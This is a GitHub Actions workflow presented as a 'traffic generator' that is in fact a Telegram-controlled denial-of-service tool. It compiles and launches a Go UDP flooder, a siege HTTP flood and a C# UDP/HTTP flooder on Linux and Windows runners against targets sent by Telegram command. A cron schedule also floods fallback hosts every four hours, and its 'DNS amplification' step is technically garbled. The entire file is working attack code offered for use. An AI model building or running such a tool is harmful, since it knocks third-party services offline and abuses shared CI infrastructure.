name: 🚀 ULTIMATE Traffic Generator - Telegram Controlled
on: 
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP/Hostname'
        required: false
        default: ''
        type: string
      target_port:
        description: 'Target Port'
        required: false
        default: '80'
        type: string
      duration:
        description: 'Duration (seconds)'
        required: false
        default: '60'
        type: string
      attack_type:
        description: 'Attack Type'
        required: false
        default: 'mixed'
        type: choice
        options:
        - udp
        - http
        - mixed
  schedule:
    - cron: '0 */4 * * *'

env:
  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
  TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}

jobs:
  process-telegram-command:
    runs-on: ubuntu-latest
    outputs:
      target_ip: ${{ steps.process-cmd.outputs.target_ip }}
      target_port: ${{ steps.process-cmd.outputs.target_port }}
      duration: ${{ steps.process-cmd.outputs.duration }}
      attack_type: ${{ steps.process-cmd.outputs.attack_type }}
    steps:
    - name: 📱 Check for Telegram command
      id: process-cmd
      run: |
        # Default values if not provided via workflow_dispatch
        IP="${INPUT_TARGET_IP:-}"
        PORT="${INPUT_TARGET_PORT:-80}"
        DURATION="${INPUT_DURATION:-60}"
        ATTACK_TYPE="${INPUT_ATTACK_TYPE:-mixed}"
        
        # If no IP provided, check for Telegram command
        if [ -z "$IP" ]; then
          echo "Checking for Telegram commands..."
          RESPONSE=$(curl -s "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/getUpdates?offset=-1")
          LAST_MSG=$(echo "$RESPONSE" | grep -o '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
          
          if echo "$LAST_MSG" | grep -q "^/attack"; then
            echo "Processing Telegram command: $LAST_MSG"
            # Parse command: /attack <ip> <port> <duration> <type>
            IP=$(echo "$LAST_MSG" | cut -d' ' -f2)
            PORT=$(echo "$LAST_MSG" | cut -d' ' -f3)
            DURATION=$(echo "$LAST_MSG" | cut -d' ' -f4)
            ATTACK_TYPE=$(echo "$LAST_MSG" | cut -d' ' -f5)
            
            # Send acknowledgement
            curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
              -d "chat_id=$TELEGRAM_CHAT_ID" \
              -d "text=🎯 Attack scheduled!%0ATarget: $IP:$PORT%0ADuration: ${DURATION}s%0AType: $ATTACK_TYPE" \
              -d "parse_mode=HTML"
          else
            # Fallback to random target
            targets=("example.com:80" "test.com:443" "demo.org:80")
            selected_target=${targets[$RANDOM % ${#targets[@]}]}
            IP=${selected_target%:*}
            PORT=${selected_target#*:}
          fi
        fi
        
        echo "target_ip=$IP" >> $GITHUB_OUTPUT
        echo "target_port=$PORT" >> $GITHUB_OUTPUT
        echo "duration=$DURATION" >> $GITHUB_OUTPUT
        echo "attack_type=$ATTACK_TYPE" >> $GITHUB_OUTPUT
        echo "Selected target: $IP:$PORT for $DURATION seconds ($ATTACK_TYPE attack)"
      env:
        INPUT_TARGET_IP: ${{ github.event.inputs.target_ip }}
        INPUT_TARGET_PORT: ${{ github.event.inputs.target_port }}
        INPUT_DURATION: ${{ github.event.inputs.duration }}
        INPUT_ATTACK_TYPE: ${{ github.event.inputs.attack_type }}

  send-start-notification:
    needs: process-telegram-command
    runs-on: ubuntu-latest
    steps:
    - name: 📱 Send start notification
      run: |
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
          -d "chat_id=$TELEGRAM_CHAT_ID" \
          -d "text=🚀 Attack starting!%0A⏰ Duration: ${{ needs.process-telegram-command.outputs.duration }}s%0A🎯 Target: ${{ needs.process-telegram-command.outputs.target_ip }}:${{ needs.process-telegram-command.outputs.target_port }}%0A⚡ Type: ${{ needs.process-telegram-command.outputs.attack_type }}" \
          -d "parse_mode=HTML"

  linux-attack:
    needs: [process-telegram-command, send-start-notification]
    runs-on: ubuntu-latest
    steps:
    - name: 🎯 Checkout repo
      uses: actions/checkout@v4

    - name: ⚡ Install tools
      run: |
        sudo apt-get update
        sudo apt-get install -y \
          hping3 \
          siege \
          curl \
          dnsutils \
          python3 \
          python3-pip \
          golang

    - name: 🔨 Compile optimized attacker
      run: |
        cat > super_attacker.go << 'EOF'
        package main
        
        import (
            "fmt"
            "net"
            "os"
            "strconv"
            "time"
            "sync"
        )
        
        func main() {
            if len(os.Args) != 4 {
                fmt.Println("Usage: ./attacker <ip> <port> <duration>")
                return
            }
            
            target := os.Args[1]
            port, _ := strconv.Atoi(os.Args[2])
            duration, _ := strconv.Atoi(os.Args[3])
            
            var wg sync.WaitGroup
            for i := 0; i < 500; i++ {
                wg.Add(1)
                go func() {
                    defer wg.Done()
                    attack(target, port, duration)
                }()
            }
            wg.Wait()
        }
        
        func attack(ip string, port, duration int) {
            conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
            if err != nil {
                return
            }
            defer conn.Close()
            
            timeout := time.Duration(duration) * time.Second
            end := time.Now().Add(timeout)
            
            packet := make([]byte, 1024)
            for i := range packet {
                packet[i] = byte(i % 256)
            }
            
            for time.Now().Before(end) {
                conn.Write(packet)
                time.Sleep(10 * time.Microsecond)
            }
        }
        EOF
        
        go build -o attacker super_attacker.go

    - name: 🚀 Run Attack Based on Type
      run: |
        TARGET_IP="${{ needs.process-telegram-command.outputs.target_ip }}"
        TARGET_PORT="${{ needs.process-telegram-command.outputs.target_port }}"
        DURATION="${{ needs.process-telegram-command.outputs.duration }}"
        ATTACK_TYPE="${{ needs.process-telegram-command.outputs.attack_type }}"
        
        echo "Starting $ATTACK_TYPE attack on $TARGET_IP:$TARGET_PORT for $DURATION seconds"
        
        if [ "$ATTACK_TYPE" = "udp" ] || [ "$ATTACK_TYPE" = "mixed" ]; then
          echo "Starting UDP flood..."
          ./attacker "$TARGET_IP" "$TARGET_PORT" "$DURATION" &
        fi
        
        if [ "$ATTACK_TYPE" = "http" ] || [ "$ATTACK_TYPE" = "mixed" ]; then
          echo "Starting HTTP flood..."
          timeout "$DURATION" siege -b -c 100 "http://$TARGET_IP:$TARGET_PORT/" &
        fi
        
        # DNS amplification for mixed attacks
        if [ "$ATTACK_TYPE" = "mixed" ]; then
          echo "Starting DNS amplification..."
          timeout "$DURATION" dig @8.8.8.8 "$TARGET_IP" ANY +subnet=0.0.0.0/0 >/dev/null 2>&1 &
        fi
        
        # Wait for all attacks to complete
        wait

  windows-attack:
    needs: process-telegram-command
    runs-on: windows-latest
    steps:
    - name: 🪟 Windows Power Attack
      run: |
        $target = "${{ needs.process-telegram-command.outputs.target_ip }}"
        $port = "${{ needs.process-telegram-command.outputs.target_port }}"
        $duration = "${{ needs.process-telegram-command.outputs.duration }}"
        $attackType = "${{ needs.process-telegram-command.outputs.attack_type }}"
        
        # Create powerful Windows attack
        $code = @"
        using System;
        using System.Net;
        using System.Net.Sockets;
        using System.Threading;
        using System.Text;
        
        public class MegaAttacker {
            public static void Main(string[] args) {
                string target = "$target";
                int port = $port;
                int attackDuration = $duration;
                string attackType = "$attackType";
                
                if (attackType == "udp" || attackType == "mixed") {
                    for(int i = 0; i < 200; i++) {
                        new Thread(() => {
                            UDPFlood(target, port, attackDuration);
                        }).Start();
                    }
                }
                
                if (attackType == "http" || attackType == "mixed") {
                    for(int i = 0; i < 100; i++) {
                        new Thread(() => {
                            HTTPFlood(target, port, attackDuration);
                        }).Start();
                    }
                }
                
                // Keep main thread alive
                Thread.Sleep(attackDuration * 1000 + 5000);
            }
            
            static void UDPFlood(string ip, int port, int duration) {
                UdpClient client = new UdpClient();
                client.Connect(ip, port);
                
                byte[] data = new byte[1024];
                new Random().NextBytes(data);
                
                DateTime end = DateTime.Now.AddSeconds(duration);
                while(DateTime.Now < end) {
                    client.Send(data, data.Length);
                }
            }
            
            static void HTTPFlood(string ip, int port, int duration) {
                DateTime end = DateTime.Now.AddSeconds(duration);
                while(DateTime.Now < end) {
                    try {
                        HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://" + ip + ":" + port + "/");
                        req.Method = "GET";
                        req.Timeout = 5000;
                        req.GetResponse().Close();
                    } catch {}
                }
            }
        }
"@
        
        Add-Type -TypeDefinition $code -Language CSharp
        [MegaAttacker]::Main(@())

  send-completion-notification:
    needs: [linux-attack, windows-attack]
    runs-on: ubuntu-latest
    steps:
    - name: 📱 Send completion notification
      run: |
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
          -d "chat_id=$TELEGRAM_CHAT_ID" \
          -d "text=✅ Attack completed!%0A🎯 Target: ${{ needs.process-telegram-command.outputs.target_ip }}:${{ needs.process-telegram-command.outputs.target_port }}%0A⏰ Duration: ${{ needs.process-telegram-command.outputs.duration }}s%0A⚡ Type: ${{ needs.process-telegram-command.outputs.attack_type }}%0A📊 Status: Success" \
          -d "parse_mode=HTML"

  error-handling:
    runs-on: ubuntu-latest
    if: failure()
    steps:
    - name: 📱 Send error notification
      run: |
        curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
          -d "chat_id=$TELEGRAM_CHAT_ID" \
          -d "text=❌ Attack failed!%0A🎯 Target: ${{ needs.process-telegram-command.outputs.target_ip }}:${{ needs.process-telegram-command.outputs.target_port }}%0A⏰ Duration: ${{ needs.process-telegram-command.outputs.duration }}s%0A🔧 Check logs: https://github.com/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" \
          -d "parse_mode=HTML"
